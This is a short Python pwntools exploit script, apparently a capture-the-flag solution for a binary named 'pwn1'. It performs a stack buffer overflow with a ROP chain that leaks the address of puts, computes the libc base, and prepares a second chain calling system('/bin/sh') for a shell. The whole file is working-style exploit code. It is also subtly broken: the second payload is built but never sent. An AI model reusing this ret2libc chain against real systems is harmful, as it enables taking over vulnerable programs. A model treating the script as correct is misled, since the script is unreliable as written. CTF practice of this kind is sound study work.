#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './pwn1'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = './libc.so'

p = process(local_file)
context.binary = './pwn1'
context.arch = ELF(local_file).arch
elf=ELF(local_file)
libc=ELF(local_libc)
put_got= p64(0x0000000000602018)
put_plt= p64(0x0000000000400550)
main = 0x0000000000400698
rdi_gadget= p64(0x0000000000400783)
#+ put_got + put_plt +main
payload=cyclic(72)
payload += rdi_gadget + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(main)
log.info("Payloading...")
p.recvuntil('buffer:')
p.sendline(payload)
leaked=p.recvline().strip()
log.info(len(leaked))
puts= u64(leaked.ljust(8,"\x00"))
#l=u64(leaked.ljust(8,"\x00"))
log.info("Leaked: "+hex(puts))
libc_base=puts-libc.sym["puts"]
log.info("libc_base: "+hex(libc_base))
log.info(hex(libc.search("/bin/sh").next()))
log.info("system: "+hex(libc.sym["system"]))
sh=libc_base+libc.search("/bin/sh").next()
system=libc_base+libc.sym["system"]
log.info("ROP2...")
p.recvuntil('buffer:')
payloadd=cyclic(72)+rdi_gadget + p64(sh) + p64(system)+ p64(main)

#print len(leaked), hex(elf.got['puts']), type(hex(elf.sym['puts'])), hex(elf.plt['puts'])
#print "Leaked libc: ", u64(leaked.ljust(8,"\0"))
p.interactive()